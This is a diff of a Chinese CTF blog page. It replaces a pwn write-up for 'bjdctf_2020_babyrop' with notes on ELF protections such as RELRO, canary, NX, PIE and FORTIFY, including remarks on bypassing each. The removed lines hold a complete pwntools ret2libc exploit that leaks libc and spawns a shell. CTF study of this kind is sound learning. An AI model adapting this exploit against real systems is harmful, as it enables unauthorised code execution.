@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>bjdctf_2020_babyrop | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" ROP ">
-  <meta name="description" content="bjdctf_2020_babyrop | sixpar&#39;s blog">
+  <title>ELF保护机制 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 基础 ">
+  <meta name="description" content="ELF保护机制 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -338,9 +338,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-bjdctf-2020-babyrop" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-ELF保护机制" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">bjdctf_2020_babyrop</h1>
+        <h1 class="article-title">ELF保护机制</h1>
     
     <div class="article-meta">
         
@@ -350,7 +350,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="PWN题">PWN题</a>
+            <a  data-rel="笔记">笔记</a>
             
         </span>
         
@@ -358,19 +358,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">ROP</a>
+            <a class="color3">基础</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-03 13:06:14'>2020-07-03 12:40</time>
+            Created At : <time class="date" title='Updated At: 2020-07-04 15:31:03'>2020-07-04 14:33</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:203</span>
+        <span>Count:866</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -400,7 +400,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制（64位）"><span class="toc-text">保护机制（64位）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路："><span class="toc-text">利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#用checksec命令检查保护机制："><span class="toc-text">用checksec命令检查保护机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF保护机制介绍："><span class="toc-text">ELF保护机制介绍：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-RELRO-："><span class="toc-text">1.RELRO ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Stack-："><span class="toc-text">2.Stack ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-NX："><span class="toc-text">3.NX：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-PIE："><span class="toc-text">4.PIE：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-FORTIFY："><span class="toc-text">5.FORTIFY：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -416,12 +416,27 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>这题算是比较经典的rop题目吧。Mark</p>
-<h2 id="保护机制（64位）"><a href="#保护机制（64位）" class="headerlink" title="保护机制（64位）"></a>保护机制（64位）</h2><blockquote>
-<p>  Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)</p>
+        <h2 id="用checksec命令检查保护机制："><a href="#用checksec命令检查保护机制：" class="headerlink" title="用checksec命令检查保护机制："></a>用checksec命令检查保护机制：</h2><p>检查保护机制用 checksec 命令：</p>
+<blockquote>
+<p>checksec filename</p>
 </blockquote>
-<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>多亏了这个溢出，直接rop一波流。puts函数泄露puts地址，返回地址填main函数。通过puts地址计算system和binsh字符串的地址。再次构造rop链，通过rdi传参，system(“/bin/sh”)。</p>
-<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=remote('node3.buuoj.cn',28703)</span></span><br><span class="line">p=process(<span class="string">'./bjdctf_2020_babyrop'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./bjdctf_2020_babyrop'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400733</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr=<span class="number">0x4006AD</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">'tell me u story!'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts addr is :"</span>+hex(puts_addr)</span><br><span class="line">libc_base= puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr=libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr= libc_base+ libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>得到如下：</p>
+<blockquote>
+<ul>
+<li>Arch:     amd64-64-little</li>
+<li>RELRO:    Partial RELRO</li>
+<li>Stack:    Canary found</li>
+<li>NX:       NX enabled</li>
+<li>PIE:      No PIE (0x400000)</li>
+</ul>
+</blockquote>
+<p>会得到elf运行平台和相关安全措施和保护机制。可见是一个64位ELF文件。字体是绿色表示该保护机制是开启状态。<br>如果单纯用gcc编译一个C源码不加任何参数的话，默认会开启所有的保护机制。详情请看笔记《gcc编译过程和保护机制》</p>
+<h2 id="ELF保护机制介绍："><a href="#ELF保护机制介绍：" class="headerlink" title="ELF保护机制介绍："></a>ELF保护机制介绍：</h2><h3 id="1-RELRO-："><a href="#1-RELRO-：" class="headerlink" title="1.RELRO ："></a>1.RELRO ：</h3><p>重定位只读。它能保护库函数的调用不受攻击者重定向的影响。<br>它有两种状态： Partial RELRO（黄色） 和 FULL RELRO（绿色）。FULL RELRO表示开启状态，则攻击者无法修改 got 表。</p>
+<h3 id="2-Stack-："><a href="#2-Stack-：" class="headerlink" title="2.Stack ："></a>2.Stack ：</h3><p>canary意为金丝雀， 如果栈中开启 Canary保护机制 （Canary found） ，就不能直接用溢出的方式来覆盖栈中的返回地址。而要通过改写指针与局部变量、leak canary 、overwrite cannary 的方法来绕过，详情请看笔记《绕过canary机制的几种方法总结》。<br>该保护机制的缺陷：仅保护了sip，未保护应用变量，覆写GOT绕过。</p>
+<h3 id="3-NX："><a href="#3-NX：" class="headerlink" title="3.NX："></a>3.NX：</h3><p>如果开启 NX enabled 保护，则栈中数据没有执行权限，栈和bss段就只有读写权限了。以前用的 call esp 或者 jmp esp的方法就不能用了。以及相关的shellcode也都不能使用了。 但可以用ROP的方式绕过拿到系统权限。如果程序很复杂或者使用静态编译的话，可以使用ROPgadget这个工具找到相关gadgets然后构造ROP利用链。</p>
+<h3 id="4-PIE："><a href="#4-PIE：" class="headerlink" title="4.PIE："></a>4.PIE：</h3><p>如果开启 PIE enabled 保护，则地址随机化（ASLR），每次运行时地址都会变化，然后IDA分析ELF文件显示给你的都是偏移地址。且只有把运行中的程序截断下来查看时才会得到具体的地址。所以我们就需要在不打扰程序运行的前提下令程序泄露出某个地址，然后根据函数之间的固定偏移，求出现在另一个函数的实际内存地址是多少。<br>若没有开启PIE机制的话，64位程序就显示的是 No PIE （0x400000），括号内的地址就是程序的基地址image_base。而32位程序则是 NO PIE(0x8048000)。</p>
+<p>当然也有应对PIE 地址随机化的方法：<br>摘自笔记《gdb调试》：gdb ./pwn 打开gdb调试 ， 然后 r 加载运行程序 ， 然后在另开一个终端输入 “ps -ef |grep pwn” 得到pwn程序的PID ，然后 “cat /proc/pid/maps” 查看内存信息，得到基址，一般是第一行的start地址，那么就得到了实际地址 = 基址+IDA的相对偏移。然后就可以在第一个终端正在运行的程序里对该地址下断点，进行后续操作。</p>
+<h3 id="5-FORTIFY："><a href="#5-FORTIFY：" class="headerlink" title="5.FORTIFY："></a>5.FORTIFY：</h3><p>有时候还会蹦出这么个保护机制。FORTIFY_SOURCE 机制对格式化字符串有两个限制：<br>(1)包含%n的格式化字符串不能位于程序内存中的可写地址；(2)当使用位置参数时，必须使用范围内的所有参数。<br>所以如果要使用 %7$x ，就必须要同时使用1,2,3,4,5,6 。FORTIFTY确定函数执行栈的大小，以避免缓冲区溢出攻击。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
